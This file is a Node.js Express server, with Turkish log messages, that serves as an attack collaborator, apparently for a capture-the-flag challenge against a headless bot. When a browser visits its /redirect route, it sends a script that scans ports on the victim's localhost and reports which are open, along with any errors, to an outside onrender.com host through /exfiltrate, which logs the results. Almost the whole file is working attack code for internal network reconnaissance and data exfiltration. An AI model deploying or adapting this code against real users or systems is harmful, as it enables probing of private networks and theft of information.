const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/redirect', (req, res) => {
    console.log("\n--- BOT Yakalandı! Port Tarama Payload'ı Gönderiliyor ---");
    
    const htmlPayload = `
    <html>
      <body>
        <h2>Scanning internal ports...</h2>
        <script>
          const ports = [80, 443, 2052, 2053, 2082, 2083, 2086, 2087, 2095, 2096, 8080, 8443, 8880];
          ports.forEach(port => {
            const targetUrl = "http://127.0.0.1:" + port + "/";
            fetch(targetUrl, { mode: 'no-cors' })
              .then(() => {
                fetch('https://collab-67oj.onrender.com/exfiltrate?status=open&port=' + port);
              })
              .catch(err => {
                fetch('https://collab-67oj.onrender.com/exfiltrate?status=error&port=' + port + '&error=' + encodeURIComponent(err.toString()));
              });
          });
        </script>
      </body>
    </html>
    `;

    res.setHeader('Content-Type', 'text/html');
    return res.status(200).send(htmlPayload);
});

app.get('/exfiltrate', (req, res) => {
    console.log("Port Sonucu:", req.query);
    return res.status(200).send("OK");
});

app.use((req, res) => {
    return res.status(200).send("OK");
});

app.listen(3000, () => console.log("Collaborator 3000 portunda hazır!"));
